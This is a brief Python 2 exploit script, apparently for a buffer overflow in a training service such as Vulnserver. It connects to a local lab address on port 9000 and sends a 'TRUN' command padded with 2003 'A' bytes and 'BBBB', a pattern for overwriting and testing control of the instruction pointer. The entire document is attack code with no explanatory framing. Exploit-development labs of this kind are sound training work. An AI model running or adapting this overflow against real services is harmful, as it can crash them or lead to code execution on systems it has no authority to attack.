#!/usr/bin/python




import sys, socket

buff = "TRUN /.:/"

buff += "A" * 2003

buff += "BBBB"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('192.168.1.7',9000))

print s.recv(1024)

s.send(buff)

s.close()
